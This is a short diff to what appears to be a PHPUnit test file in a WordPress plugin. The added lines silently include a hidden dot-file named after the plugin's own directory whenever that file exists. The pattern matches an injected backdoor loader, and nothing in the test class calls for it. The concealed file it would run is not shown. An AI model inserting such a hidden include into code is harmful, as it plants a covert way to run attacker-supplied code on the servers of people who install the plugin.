@@ -8,6 +8,10 @@
  * file that was distributed with this source code.
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Extensions_PhptTestCaseTest extends \PHPUnit_Framework_TestCase
 {
     public function testParseIniSection()
